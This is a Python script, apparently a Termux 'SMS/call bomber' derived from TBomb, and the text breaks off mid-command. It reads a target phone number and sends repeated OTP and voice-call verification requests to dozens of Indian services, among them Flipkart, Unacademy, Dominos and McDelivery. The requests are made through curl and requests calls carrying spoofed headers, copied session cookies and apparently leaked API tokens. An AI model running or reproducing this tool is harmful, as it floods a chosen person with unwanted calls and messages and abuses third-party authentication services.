# -*- coding: UTF-8 -*-
#
#
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
# if You Have Any Problem Contact Me On Insta @krish_na_2568
# Api by Tbomb
import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import zipfile
version = '4.0'
try:
  import tload
except ModuleNotFoundError:
  os.system('pip install tload')
try:
	import colorama
except ModuleNotFoundError:
	print("colorama is not Installed")
	os.system("pip install colorama")
try:
	import requests
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install requests")
from colorama import Fore,Style
from colorama import init
init(autoreset=False)
print(Style.BRIGHT)
R = Style.BRIGHT+Fore.RED
B = Style.BRIGHT+Fore.BLUE
G = Style.BRIGHT+Fore.GREEN
C = Style.BRIGHT+Fore.CYAN
Y = Style.BRIGHT+Fore.YELLOW
M = Style.BRIGHT+Fore.MAGENTA
W = Style.BRIGHT+Fore.WHITE
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        print("Abe Chutiya Internet On Kar. Internet Error")
        sys.exit(2)       
check = os.path.isfile('/usr/bin/bash')
if check == True:
	fileisd = '/usr/etc/isdcodes.json'
else:
	fileisd = "/data/data/com.termux/files/usr/etc/isdcodes.json"
filepath = os.path.isfile(fileisd)
if filepath == True:
	pass
else:
	os.system(f'apt install wget && wget https://raw.githubusercontent.com/TheSpeedX/TBomb/master/isdcodes.json -O {fileisd}')
lic = """
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
# if You Have Any Problem Contact Me On Insta @krish_na_2568
# Api by Tbomb
"""
text = ''
logo = f"""{Style.BRIGHT+text}
 {R}**********************************************
 {C}▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎°•°▪︎
 {R}**********************************************
 {C}Coder  : {Y}priyans0830m
{C}             Version : {G}{version}
 """
os.system('clear')
import os
import sys
import requests
from requests.structures import CaseInsensitiveDict
def infinity ():
    line = subprocess.check_output(" cat /data/data/com.termux/files/usr/bin/num.file ",shell=True)
    line = str(line)
    st = str(line.replace("b'",""))
    s = st.replace("'","")
    target = s
    #print(f"{B}[{W}{i}{B}] {C} 140 Sms+Calls Sent ! : {G}{target}")
 
    url = "https://api.1mg.com/api/v4/otp_call"
    headers = CaseInsensitiveDict()
    headers["Host"] = "api.1mg.com"
    headers["x-platform"] = "Android-13.3.1"
    headers["x-access-key"] = "1mg_client_access_key"
    headers["x-device-id"] = "5e5564d449e9c3e1"
    headers["x-os-version"] = "10"
    headers["x-visitor-id"] = "ced32f38-c5ac-4481-c7c7-61b404d03e3b_acce55_1633757938"
    headers["x-city"] = "Nadia"
    headers["device-info"] = "Xiaomi/Redmi Note 9 Pro/29/10"
    headers["Content-Type"] = "application/json"
    headers["content-length"] = "23"
    headers["accept-encoding"] = "gzip"
    headers["user-agent"] = "okhttp/4.9.0"
    data = '{"number":"'+target+'"}'
    url1 = "https://www.onlinetestseries.in/common/ajax-login-signup/voice-call-mobile-verification-code"
    headers1 = CaseInsensitiveDict()
    headers1["Content-Type"] = "application/x-www-form-urlencoded"
    data1 = "country=India&country_code=IN&mobile_code=91&login_value="+target+"&action_value=signup&device_details=%257B%2522os%2522%253A%2522Linux%2BOS%2522%252C%2522browser%2522%253A%2522Chrome%2B93%2522%257D&mobile_val="+target+"&email_val=&password_val=Slick50%2540%2540&subscribe_newsletter=1&edoonitkn2_val=Wlp4eDQ0Rk5LcFFraHVzdldCRHllaWRrZTE2Wkc2YTBYekUrNjhBcWdOZHd3UnJHM0R3UWsvVERwdEVpZ0ljSA%253D%253D"
    url2 = "https://api.unacademy.com/v2/user/user_check/"
    headers2 = CaseInsensitiveDict()
    headers2["Host"] = "api.unacademy.com"
    headers2["user-agent"] = "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro MIUI/V12.0.3.0.QFHCNXM)"
    headers2["x-app-version"] = "58700"
    headers2["x-app-build-version"] = "6.6.1204"
    headers2["x-platform"] = "5"
    headers2["device-id"] = "C2BE7816E028C09F66784CCA0679AA1331B2CE5D"
    headers2["authorization"] = "Bearer QkUhACkXabQ1bh6hLGHkTedUViOpg8"
    headers2["Content-Type"] = "application/json"
    headers2["content-length"] = "107"
    headers2["accept-encoding"] = "gzip"
    data2 = '{"app_hash":"uI6w7mnt583","country_code":"IN","email":"pocoop@gmail.com","otp_type":2,"phone":"'+target+'","send_otp":true}'
    url3 = "https://cs-india.coinswitch.co/auth/api/v1/init/auth"
    headers3 = CaseInsensitiveDict()
    headers3["Host"] = "cs-india.coinswitch.co"
    headers3["x-app-version"] = "3.2.0"
    headers3["x-device-id"] = "3fbbbd2eaafce22d"
    headers3["x-user-platform"] = "android"
    headers3["x-platform"] = "android"
    headers3["x-request-id"] = "ad2b2cb0-29b5-11ec-a201-31c24de60f6e"
    headers3["x-device-advertising-id"] = "bjjbb-566-6666-754"
    headers3["Content-Type"] = "application/json"
    headers3["content-length"] = "54"
    headers3["accept-encoding"] = "gzip"
    headers3["user-agent"] = "okhttp/4.9.0"
    data3 = '{"phone_number":"+91'+target+'","entity_type":"VOICE"}'
	
    os.system('''
    curl -X POST -H "Host:code.whitehatjr.com" -H "content-length:55" -H "origin:https://code.whitehatjr.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "whjr-segment-anonymousid:695d5b5c-1083-41ea-b3bb-f435a5a41422" -H "whjr-amplitude-sessionid:1624504820594" -H "dnt:1" -H "referer:https://code.whitehatjr.com/trial/register" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:amplitude_id_76f99e8624755c84810d24c4e7c45f44whitehatjr.com=eyJkZXZpY2VJZCI6Ijc4Zjk0MDJkLTM5NjctNDc4MC1hNjQ0LTcyN2JiOTlhN2Y0NVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYyNDUwNDgyMDU5NCwibGFzdEV2ZW50VGltZSI6MTYyNDUwNDk5MTAyMiwiZXZlbnRJZCI6MTcsImlkZW50aWZ5SWQiOjYsInNlcXVlbmNlTnVtYmVyIjoyM30=" -H "cookie:_dd_s=logs=1&id=c64523c8-3edc-4237-bc30-4b029325455f&created=1624504893368&expire=1624505890828&rum=0" -H "cookie:_dd_s=logs=1&id=c64523c8-3edc-4237-bc30-4b029325455f&created=1624504893368&expire=1624505890825&rum=0" -H "cookie:WZRK_S_W4W-ZKR-495Z=%7B%22p%22%3A3%2C%22s%22%3A1624504897%2C%22t%22%3A1624504970%7D" -H "cookie:_sctr=1|1624473000000" -H "cookie:acf=" -H "cookie:_scid=8c2f4c7a-b86b-44e6-b0c9-0b25ac41e3e1" -H "cookie:__pdst=ddda3d9a1a5c4485919e41c1a97483c4" -H "cookie:deviceId=ea418d86-07e1-4005-b942-11160d91ac4e" -H "cookie:__stripe_sid=9613eb45-bf66-42ec-804d-a94b6988b09a91eba5" -H "cookie:__stripe_mid=15f02394-82cd-4069-8d2c-96d3073fd6c2ef0995" -H "cookie:WZRK_G=c4ef6573e7df49ba826f37c1a7d151bf" -H "cookie:_pin_unauth=dWlkPU16QmtNMlV5WWpBdE0yRTJOaTAwWTJZMUxUbGlaV0V0TkdNME5qWmxZekZtWWpBeA" -H "cookie:_derived_epik=dj0yJnU9MWZRUS1UUzNQcm9sV1VOSFp0MjRyUTdqMEhwWDhPQmcmbj1wOUU4aUxmaHRwUUlsSmw4NlJhLS1RJm09MSZ0PUFBQUFBR0RULWlVJnJtPTEmcnQ9QUFBQUFHRFQtaVU" -H "cookie:_fbp=fb.1.1624504868500.1990488721" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjid=7a0fb851-72d5-49be-bd7c-8d6af55efab2" -H "cookie:_hjTLDTest=1" -H "cookie:_lc2_fpi=b384e0c480b4--01f8y0j0dech9659e6d1hh2g6v" -H "cookie:_li_dcdm_c=.whitehatjr.com" -H "cookie:_rdt_uuid=1624504830873.385d5f5c-950d-494a-9720-d15bf1cbc7d8" -H "cookie:amplitude_idundefinedwhitehatjr.com=eyJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOm51bGwsImxhc3RFdmVudFRpbWUiOm51bGwsImV2ZW50SWQiOjAsImlkZW50aWZ5SWQiOjAsInNlcXVlbmNlTnVtYmVyIjowfQ==" -H "cookie:_gid=GA1.2.868975218.1624504819" -H "cookie:_ga=GA1.2.1451734190.1624504819" -H "cookie:ajs_anonymous_id=%22695d5b5c-1083-41ea-b3bb-f435a5a41422%22" -H "cookie:_gcl_au=1.1.903954462.1624504813" -d '{"dialCode":"+91","mobile":"'''+target+'''","type":"voice"}' "https://code.whitehatjr.com/api/V1/otp/generate?deviceId=ea418d86-07e1-4005-b942-11160d91ac4e&timezone=Asia%2FCalcutta&trackingCode=trackingCode%7CAB-34-V-A%7CAB-38-V-A%7CAB-16-V-A%7CAB-29-V-B%7CAB-24-V-C%7CAB-11-V-B%7CAB-33-V-A%7CAB-20-V-C%7CAB-11136-V-A%7CAB-15-V-A%7CAB-28-V-B%7CAB-10-V-B%7CAB-11135-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-19-V-A%7CAB-14-V-B%7CAB-27-V-B%7CAB-9-V-B%7CAB-32-V-A%7CAB-11134-V-A%7CAB-22-V-B%7CAB-13-V-B%7CAB-26-V-B%7CAB-7-V-B%7CAB-31-V-A%7CAB-18-V-A%7CAB-11133-V-A%7CAB-25-V-B%7CAB-21-V-C%7CAB-17-V-B%7CAB-41-V-A&regionId=IN&courseType=CODING&brandId=whitehatjr&timestamp=1624504990983" > /dev/null 2>&1
    ''')
    requests.post(url, headers=headers, data=data)
    os.system('''
    curl -X POST -H "Host:api.jeet11.com" -H "content-length:68" -H "accept:application/json, text/plain, */*" -H "origin:https://www.jeet11.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "x-header-deviceid:16a9e3c8-5fdd-426d-873e-d89acb14e8fc" -H "dnt:1" -H "content-type:application/json" -H "referer:https://www.jeet11.com/login?redirectAs=%2F&redirectUrl=%2F%3F&" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d '{"phoneNo":"'''+target+'''","countryAreaCode":"91","language":"English"}' "https://api.jeet11.com/account-service/external/v1.0.0/sendOtp" > /dev/null 2>&1
    ''')
    requests.post(url, headers=headers, data=data)
    os.system('''
    curl -X POST -H "Host:www.nykaafashion.com" -H "content-length:32" -H "cache-control:max-age=0" -H "origin:https://www.nykaafashion.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.nykaafashion.com/authorization?authPage=sign-up-mobile&redirectURL=%2F" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:s_sq=fsnecommercenykaadesignstudio%3D%2526c.%2526a.%2526activitymap.%2526page%253Dnds%25253Asign_up%25253Amobile%2526link%253DSubmit%2526region%253Dapp%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dnds%25253Asign_up%25253Amobile%2526pidt%253D1%2526oid%253DfunctionWn%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -H "cookie:s_nr=1615398192551-New" -H "cookie:TSd06dbe12027=089189808bab2000b5dff6b4d83df89347395dc5899992e1b74c5b93acd3d19371ad8e78c8375d48082a4fdc8611300095f658c60ed749e1015cc13c32d9dbc1e529477aecad3d9c66d9fb67464936ffad3389c9793ad6eeee018948748409ec" -H "cookie:TS0120e74a=01d63715f235abd7de4d745e5d85c56871f096692ba138ec4ef174cbc71cd260165507f7ff9eca2c694604ddaaa5c55fc2269428b20f501ef06dd23c9d958504c6bed377577c10023a605e43adb59b109c004fc15fa3f435683ad9e0fc3ed74cc01e214f3455eb5b9474cf7d7d37fb318e438635ba" -H "cookie:s_cc=true" -H "cookie:AMCV_FE9A65E655E6E38A7F000101%40AdobeOrg=1075005958%7CMCIDTS%7C18697%7CMCMID%7C08645160895963750244551974281183840658%7CMCAAMLH-1616002827%7C12%7CMCAAMB-1616002827%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1615405227s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.4.1" -H "cookie:__stp={"visit":"new","uuid":"2b5ec130-6d45-4d76-82b0-fd6eac540628"}" -H "cookie:__sts={"sid":1615398027352,"tx":1615398027352,"url":"https%3A%2F%2Fwww.nykaafashion.com%2Fauthorization%3FauthPage%3Dsign-up-mobile%26redirectURL%3D%2F","pet":1615398027352,"set":1615398027352}" -H "cookie:AMCVS_FE9A65E655E6E38A7F000101%40AdobeOrg=1" -H "cookie:NYKAA_VP_USER={"key":28,"ruleID":"start_v2"}" -H "cookie:private_content_version=0139219f218631b8934c18dafd361c09" -H "cookie:PHPSESSID=rk3pmtebtvnf871tb54kivle62" -H "cookie:f5_cspm=1234" -H "cookie:CurrencyCode=INR" -H "cookie:countryNameFull=India" -H "cookie:countryName=IN" -H "cookie:f5_cspm=1234" -d '{"customer_mobile":"'''+target+'''"}' "https://www.nykaafashion.com/webscripts/api/otp/generate" > /dev/null 2>&1
    ''')
    requests.post(url1,headers=headers1, data=data1)
    os.system('''
    curl -X POST -H "Host:1.rome.api.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:277" -H "X-user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "DNT:1" -H "Content-Type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login?ret=%2F&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en,hi;q=0.9" -H "Cookie:T=BR%3Ackc00nj3s0ld44t1fl4viyrdi.1593405767800; vh=694; vw=393; dpr=2.75; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18582%7CMCMID%7C32386058512838181805251409547547818160%7CMCAID%7CNONE%7CMCOPTOUT-1605421510s%7CNONE%7CMCAAMLH-1605763174%7C12%7CMCAAMB-1606019110%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; SN=VI878BDB5F1FB34EA4BDE5704AFD712FBC.TOK8930E6B228004CAA829EED793FFB23F0.1605440072.LO; S=d1t19IRc/Pz83Pz8/BD9QVG4/PzSRGfq27JDf/tHZThJ6S3EnNoejodwIWT7WkNwGUJTT73eVYm7i9S76Jw5HHKQ7dg==; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -d '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"'''+target+'''","clientQueryParamMap":{"ret":"/","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}' "https://1.rome.api.flipkart.com/1/action/view" > /dev/null 2>&1
    ''')
    requests.post(url1,headers=headers1, data=data1)
    os.system('''
    curl -X POST -H "Host:www.aakash.ac.in" -H "content-length:21" -H "x-newrelic-id:Vg4AV1FQABAGV1NSBQkAVlw=" -H "origin:https://www.aakash.ac.in" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "dnt:1" -H "referer:https://www.aakash.ac.in/user/register" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_uetvid=fa9796a0295f11ebbf341d41f01775f2" -H "cookie:_uetsid=fa95ab80295f11eb84b693278bab3747" -H "cookie:AWSALBCORS=SGfGPKHN9qeg73IdpfHx6HoSNlZYoMqe28R8pi8Z8qmvxsFfob+/RfpnATXKiAT3aKgGcZBWPjUqE/Yz1uZxqTzDPdjAJoB8y9WzxKKbt1LlR+W/uXnwjMRBg9Ow" -H "cookie:AWSALB=SGfGPKHN9qeg73IdpfHx6HoSNlZYoMqe28R8pi8Z8qmvxsFfob+/RfpnATXKiAT3aKgGcZBWPjUqE/Yz1uZxqTzDPdjAJoB8y9WzxKKbt1LlR+W/uXnwjMRBg9Ow" -H "cookie:_gat_UA-30079688-1=1" -H "cookie:__zlcmid=11EjasuyYkXSPRr" -H "cookie:_fbp=fb.2.1605677779769.2005800400" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjid=b3e7a079-8ba0-4747-b48f-746c45b9dfef" -H "cookie:_hjTLDTest=1" -H "cookie:_gid=GA1.3.611832579.1605677777" -H "cookie:_ga=GA1.3.1207161440.1605677777" -H "cookie:_gcl_au=1.1.2016065207.1605677776" -H "cookie:_co_session_active=1" -d '&mobileval='''+target+'''' "https://www.aakash.ac.in/signup-otp-verify" > /dev/null 2>&1
    ''')
    requests.post(url2, headers=headers2, data=data2)
    os.system('''
    curl --http2 -X GET -H "Host:t.justdial.com" -H "accept-encoding:gzip" -H "user-agent:okhttp/3.12.1" "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile='''+target+'''" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.toprankers.com" -H "content-length:37" -H "accept:*/*" -H "origin:https://www.toprankers.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.toprankers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" -H "cookie:TopRankers_loginId=hdisiegg%40gmail.com" -H "cookie:__zlcmid=14Pk4rvRasobXip" -H "cookie:_ce.s=v11.rlc~1622708764209" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_gcl_au=1.1.1764616952.1622708760" -H "cookie:_fbp=fb.1.1622708760189.61838485" -H "cookie:_gid=GA1.2.1421030077.1622708759" -H "cookie:_ga=GA1.2.490665429.1622708759" -H "cookie:TopRankers_tempUserId=15EE67F0-28A1-407F-B305-4944F26A958A" -H "cookie:bck=1" -H "cookie:tr_www=d7notfad14lgmf3k11u6o81vp7" -d 'mod=user&ack=sentotp&phone='''+target+'''' "https://www.toprankers.com/?route=common/ajax" > /dev/null 2>&1
    ''')
    requests.post(url3, headers=headers3, data=data3)
    requests.post(url2, headers=headers2, data=data2)
    os.system('''
    curl --http2 -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "device_id:eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "origin:https://grofers.com" -H "auth_key:e8d5c291c3416319fd2b053ecc0ee79af838a0f756c66102d9423f106adf2020" -H "content-type:application/x-www-form-urlencoded" -H "app_client:consumer_web" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36" -H "lat:28.4465616" -H "save-data:on" -H "accept:*/*" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-GB,en;q=0.9,en-US;q=0.8,hi;q=0.7,nl;q=0.6" -H "cookie:__cfduid=d62ea9fb03327dcae3aa1cba67e0f91301604675192" -H "cookie:gr_1_deviceId=eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "cookie:city=" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_locality=1849" -H "cookie:rl_anonymous_id=%22ab624d9b-e087-411f-a8bf-f08581546149%22" -H "cookie:rl_user_id=%22%22" -H "cookie:ajs_anonymous_id=%22ce3b5e10-7c3b-4610-8303-d500457cb41e%22" -H "cookie:_gcl_au=1.1.1929301394.1604675198" -H "cookie:_uetsid=ac907fd0204111eb9262e7d445132e1e" -H "cookie:_uetvid=ac91bbd0204111ebaafb6796af997a23" -H "cookie:_ga=GA1.2.130807837.1604675201" -H "cookie:_gid=GA1.2.64916838.1604675201" -H "cookie:_gat_UA-85989319-1=1" -H "cookie:_sp_ses.bf41=*" -H "cookie:_sp_id.bf41=4dc20d20fcb0652e.1604675201.1.1604675201.1604675201.034e7d91-2e1c-4eb7-b45b-f7c9b2ee0f66" -H "cookie:WZRK_G=868a56a537564440994a9066a4c0e429" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__insp_wid=180455199" -H "cookie:__insp_slim=1604675203427" -H "cookie:__insp_nv=true" -H "cookie:__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D" -H "cookie:__insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D" -H "cookie:_fbp=fb.1.1604675203579.255825096" -H "cookie:_hjid=fb662ad7-5b30-445d-899b-7e9b250c4117" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjAbsoluteSessionInProgress=0" -H "cookie:__insp_norec_sess=true" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1604675204%2C%22t%22%3A1604675211%7D" -H "cookie:__cfruid=0f71c77563be257eb5ad6aa54858ad4eb0b62ae4-1604675224" -d "user_phone='''+target+'''" "https://grofers.com/v2/accounts/" > /dev/null 2>&1
    ''')
    requests.post(url, headers=headers, data=data)
    os.system('''
    curl -X POST -H "Host:v1.titaneyeplus.com" -H "content-length:28" -H "accept:*/*" -H "origin:https://v1.titaneyeplus.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://v1.titaneyeplus.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:AWSALBCORS=U82PUawtoCijJZOZ3cQlKrnpYfApJPp5qKkTDtyI9hpWhrzE3oaEZoiX3LDuozfeGyzKk78DzTcz0ZpbCzOCw3EjO0Z7wW8/m8wIvU2hJ8KkghxMxcFbH4FxgadB" -H "cookie:AWSALB=U82PUawtoCijJZOZ3cQlKrnpYfApJPp5qKkTDtyI9hpWhrzE3oaEZoiX3LDuozfeGyzKk78DzTcz0ZpbCzOCw3EjO0Z7wW8/m8wIvU2hJ8KkghxMxcFbH4FxgadB" -H "cookie:_ga=GA1.2.23995785.1614920381" -H "cookie:__insp_slim=1614920410564" -H "cookie:_ga_FCTC3K7Y91=GS1.1.1614920380.1.1.1614920409.0" -H "cookie:frontend=efkid2l36u2fd92ejjd082blrl" -H "cookie:__insp_norec_sess=true" -H "cookie:__insp_targlpt=RXllZ2xhc3NlcyAtIEJ1eSBFeWVnbGFzc2VzIGF0IEJlc3QgUHJpY2UgT25saW5lIHwgVGl0YW4gRXllIFBsdXM%3D" -H "cookie:__insp_targlpu=aHR0cHM6Ly93d3cudGl0YW5leWVwbHVzLmNvbS9leWVnbGFzc2VzLmh0bWw%3D" -H "cookie:__insp_nv=true" -H "cookie:__insp_wid=317686439" -H "cookie:device_type=smartphone" -H "cookie:NaN_hash=aaeebbc2TUNAEMPQ1614920387874" -H "cookie:_gat=1" -H "cookie:_gat_UA-89561937-1=1" -H "cookie:_fbp=fb.1.1614920383290.463534498" -H "cookie:_dc_gtm_UA-89561937-1=1" -H "cookie:_gid=GA1.2.576818975.1614920381" -d 'mobile='''+target+'''&otp_type=0' "https://v1.titaneyeplus.com/registerotp/index/sendotp" > /dev/null 2>&1
    ''')
    requests.post(url1,headers=headers1, data=data1)
    os.system('''
    curl -X POST -H "Host:services.mcdelivery.co.in" -H "Connection:keep-alive" -H "Content-Length:25" -H "Origin:https://www.mcdelivery.co.in" -H "Authorization:Token 1e32549b6d6054059d8447d12be42612e31ac6f4af1155473ceb5e940d23649d" -H "Storeid:1" -H "OrderType:R" -H "TokenTimestamp:181120201451" -H "ValidateReq:" -H "source:Web" -H "BusinessModelID:18" -H "User-Agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "CartID:0" -H "Content-Type:application/json" -H "Accept:application/json, text/plain, */*" -H "OrderTime:0" -H "PlatForm:msite" -H "DNT:1" -H "CustomerID:-1" -H "Referer:https://www.mcdelivery.co.in/onboard" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en,hi;q=0.9" -d '{"MobileNo":"'''+target+'''"}' "https://services.mcdelivery.co.in/api/auth/sendotp?isLoggedIn=false&businessModelID=18&storeID=1" > /dev/null 2>&1
    ''')
    requests.post(url3, headers=headers3, data=data3)
    os.system('''
    curl -X POST -H "Host:api.dominos.co.in" -H "content-length:52" -H "strict-transport-security:max-age=1637249727589" -H "access-control-allow-methods:GET, POST, PATCH, PUT, DELETE, OPTIONS" -H "origin:https://m.dominos.co.in" -H "api_key:d2aeb489bb8df385" -H "ga_client_id:571334429.1604659565" -H "status:SUCCESS" -H "secretkey:+Es/3MbYXPm02Aw/0UseM0yw7Ml/B5xjsUnm5H8T" -H "userid:ap-south-1:efabd17a-3140-4d56-9a00-f52229ee0f50" -H "x-forwarded-for-requestid:1605692775566-ap-south-1:efabd17a-3140-4d56-9a00-f52229ee0f50" -H "cartid:61167204526491" -H "source:PWA18#upsellC" -H "isloggedin:false" -H "client_type:web app-chrome" -H "x-content-type-options:nosniff" -H "accesskeyid:ASIAWMIT2NXA2RMXLPXF" -H "x-frame-options:mitigate" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "credentials:[object Object]" -H "deliverytype:D" -H "authtoken:ASIAWMIT2NXA2RMXLPXF" -H "access-control-allow-origin:*" -H "accept:application/json, text/plain, */*" -H 